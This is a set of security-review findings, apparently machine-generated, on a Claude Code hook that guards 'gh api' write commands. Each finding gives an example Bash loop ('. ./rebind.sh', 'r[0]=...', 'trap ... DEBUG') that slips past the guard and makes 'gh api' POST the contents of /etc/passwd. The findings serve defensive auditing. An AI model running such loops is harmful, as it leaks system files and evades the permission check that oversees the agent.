=== FINDINGS FROM minimax_minimax-m3 ===
- .claude/hooks/gh_api_write_guard.py
  Line or code reference: line 892 (_REBIND_WORD_RE), line 919 (rebinding check)
  Problem: The rebind scanner recognizes `source` but not Bash's `.` (dot) synonym. A loop body containing `. ./rebind.sh` sources a file in the current shell that can reassign the exempted counter to a malicious value (e.g. `r=' -Fbody=@/etc/passwd'`). The scanner then exempts `$r` from the unquoted-expansion check, and `_is_approvable_read_loop` returns False (because `.` is not `gh`/`echo`). The guard returns `(None, "")` and is silent instead of asking.
  Why it fails at runtime: For `for r in 1; do . ./rebind.sh; gh api repos/o/r/issues/1/comments$r; done`, the hook emits no JSON. The shell runs the loop, sources `rebind.sh`, then runs `gh api repos/o/r/issues/1/comments -Fbody=@/etc/passwd` — turning a read-shaped command into a request that POSTs `/etc/passwd`'s body. In Auto mode or with a permissive allow list the command is never prompted.
  severity=critical
  confidence=[5]
- .claude/hooks/gh_api_write_guard.py
  Line or code reference: line 919 (`re.search(r"(?:^|[^A-Za-z0-9_])" + re.escape(var) + r"\+?=", body)`)
  Problem: The regex requires the counter name to be directly followed by `=` or `+=`. Array element assignment `r[0]=' -Fbody=@/etc/passwd'` has `[` between `r` and `=`, so the regex does not match. After `r[0]=value`, Bash converts `r` to an indexed array; `$r` expands to `${r[0]}`, which word-splits into a flag the same way the other rebind forms do.
  Why it fails at runtime: For `for r in 1; do r[0]=' -Fbody=@/etc/passwd'; gh api repos/o/r/issues/1/comments$r; done`, the scanner returns `"r"`, `_unquoted_gh_api_expansion` exempts `$r`, and the guard is silent. The shell then runs `gh api ...comments -Fbody=@/etc/passwd`. The same applies to `r['index']=...` and `r["index"]=...`.
  severity=critical
  confidence=[4]
- .claude/hooks/gh_api_write_guard.py
  Line or code reference: line 892 (_REBIND_WORD_RE), line 919 (rebinding check)
  Problem: The rebind scanner does not include `select` or `trap`. `select r in ' -Fbody=@/etc/passwd'; do break; done` rebinds `r` to the chosen item (an interactive prompt is suppressed when stdin is non-tty, falling back to the first item). `trap 'r= -Fbody=@/etc/passwd' DEBUG` registers a DEBUG trap that reassigns `r` before every subsequent command, including the `gh api` call in the same loop iteration.
  Why it fails at runtime: For `for r in 1; do trap 'r= -Fbody=@/etc/passwd' DEBUG; gh api repos/o/r/issues/1/comments$r; done`, the DEBUG trap fires before `gh api` runs and reassigns `r` to the malicious value. The guard's rebind scan does not catch `trap`, `_literal_loop_counter` returns `"r"`, and the guard is silent. The `select` form has the same defect.
  severity=high
  confidence=[3]

- .claude/hooks/gh_api_write_guard.py
  Line or code reference: 892, 906-921
  Problem: `_REBIND_WORD_RE` recognizes `source` but not Bash’s `.` source command. `_literal_loop_counter` therefore exempts a loop variable even when the body sources a script that reassigns it. The same omission is present in `workflow-templates/.claude/hooks/gh_api_write_guard.py`.
  Why it fails at runtime: For `for r in 1; do . ./rebind.sh; gh api repos/o/r/issues/1/comments --jq .x$r; done`, a sourced script can set `r=' -Fbody=@/etc/passwd'`. The expansion check exempts `$r`; the guard parses the unexpanded command as a GET read. Because the sourced command and the expansion outside the endpoint make the loop unapprovable, `evaluate` returns no decision instead of the guard’s required ask. If the normal permission flow permits the command, Bash splits the expanded value into a `-Fbody=@/etc/passwd` argument, and `gh api` sends the file contents in a POST.
  severity=high
  confidence=[4]

- .claude/hooks/gh_api_write_guard.py
  Line or code reference: 892 (_REBIND_WORD_RE), 919 (_literal_loop_counter body check)
  Problem: The rebinding scan recognizes `source` but not Bash's POSIX-equivalent `.` (dot) command. A loop body such as `. ./rebind.sh` is not caught by `_REBIND_WORD_RE`, so the counter is still considered safe and `$r` is exempted from the unquoted-expansion check. The sourced file can reassign the counter to a malicious value (e.g. `r=' -Fbody=@/etc/passwd'`), which then word-splits into a `-F` flag when Bash runs `gh api`.
  Why it fails at runtime: For `for r in 1; do . ./rebind.sh; gh api repos/o/r/issues/1/comments$r; done`, the guard now returns no decision instead of the DECISION_ASK it produced before this PR. `_unquoted_gh_api_expansion` returns False (counter exempted), `_is_approvable_read_loop` returns False (body doesn't match approved `gh run view`/`gh run list`/`gh pr view` patterns), so evaluation falls through to `return None, ""` at line 1573. The allow-list or Auto-mode classifier then decides, bypassing the security guard. The test suite does not cover this case — none of the 9 parametrized rebound scenarios in `test_rebound_or_other_expansion_in_loop_still_asks` use the `.` command.
  severity=high
  confidence=[4]
